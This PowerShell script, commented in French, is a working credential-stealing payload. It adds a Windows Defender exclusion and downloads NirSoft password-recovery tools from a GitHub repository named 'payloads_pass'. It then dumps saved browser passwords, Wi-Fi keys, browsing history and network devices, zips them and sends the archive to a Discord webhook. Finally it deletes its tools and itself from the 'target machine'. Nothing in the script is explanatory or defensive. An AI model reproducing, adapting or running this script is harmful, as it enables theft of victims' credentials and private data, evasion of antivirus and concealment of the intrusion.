[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$WebhookUrl
)

$basePath = "C:\Users\Public\Documents\scripts"
$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
$dumpFile = "$dumpFolder.zip"

# Désactivation de Defender sur le dossier
Add-MpPreference -ExclusionPath $basePath -Force

New-Item -ItemType Directory -Path $basePath -Force | Out-Null
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null

# Téléchargement des outils depuis la racine de ton dépôt GitHub
try {
    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WirelessKeyView.exe" -OutFile "$basePath\WirelessKeyView.exe" -ErrorAction Stop
    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WebBrowserPassView.exe" -OutFile "$basePath\WebBrowserPassView.exe" -ErrorAction Stop
    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/BrowsingHistoryView.exe" -OutFile "$basePath\BrowsingHistoryView.exe" -ErrorAction Stop
    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WNetWatcher.exe" -OutFile "$basePath\WNetWatcher.exe" -ErrorAction Stop
} catch {
    exit 1
}

# Fermeture des navigateurs pour déverrouiller l'accès aux bases de données chiffrées
Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

# --- CONTOURNEMENT DPAPI : Exécution interactive pour récupérer les mots de passe en clair ---
$explorer = Get-Process -IncludeUserName | Where-Object {$_.ProcessName -eq "explorer"} | Select-Object -First 1

if ($explorer) {
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = "$basePath\WebBrowserPassView.exe"
    $processInfo.Arguments = "/stext $basePath\passwords.txt"
    $processInfo.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
    Start-Sleep -Seconds 4
} else {
    Start-Process -FilePath "$basePath\WebBrowserPassView.exe" -ArgumentList "/stext $basePath\passwords.txt" -Wait -WindowStyle Hidden
}

# Exécution des autres outils avec chemins absolus
if (Test-Path "$basePath\WirelessKeyView.exe") {
    Start-Process -FilePath "$basePath\WirelessKeyView.exe" -ArgumentList "/stext $basePath\wifi.txt" -Wait -WindowStyle Hidden
}
if (Test-Path "$basePath\BrowsingHistoryView.exe") {
    Start-Process -FilePath "$basePath\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFilterType 3 7 /stext $basePath\history.txt" -Wait -WindowStyle Hidden
}
if (Test-Path "$basePath\WNetWatcher.exe") {
    Start-Process -FilePath "$basePath\WNetWatcher.exe" -ArgumentList "/stext $basePath\connected_devices.txt" -Wait -WindowStyle Hidden
}

# Vérification et sécurisation des fichiers générés
foreach ($file in @("passwords.txt", "wifi.txt", "history.txt", "connected_devices.txt")) {
    $filePath = "$basePath\$file"
    if (!(Test-Path $filePath)) {
        Set-Content -Path $filePath -Value "No data captured"
    }
    Move-Item $filePath -Destination "$dumpFolder" -Force
}

Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force

if (!(Test-Path $dumpFile)) { exit 1 }

# Envoi du fichier ZIP sur le webhook Discord
if (-not ("System.Net.Http.HttpClient" -as [type])) {
    $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
    if ($httpPath) { Add-Type -Path $httpPath } else { exit 1 }
}

$client = New-Object System.Net.Http.HttpClient
$content = New-Object System.Net.Http.MultipartFormDataContent
$content.Add((New-Object System.Net.Http.StringContent("Data from $env:USERNAME")), "content")

$fileStream = [System.IO.File]::OpenRead("$dumpFile")
$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$content.Add($fileContent, "file", [System.IO.Path]::GetFileName("$dumpFile"))

try { 
    $client.PostAsync($WebhookUrl, $content).Wait() 
} catch {}

$fileStream.Close()
$fileStream.Dispose()

# Nettoyage des traces sur la machine cible
Remove-Item -Recurse -Force $basePath
Remove-Item "C:\Users\Public\Documents\ps.ps1" -Force
exit
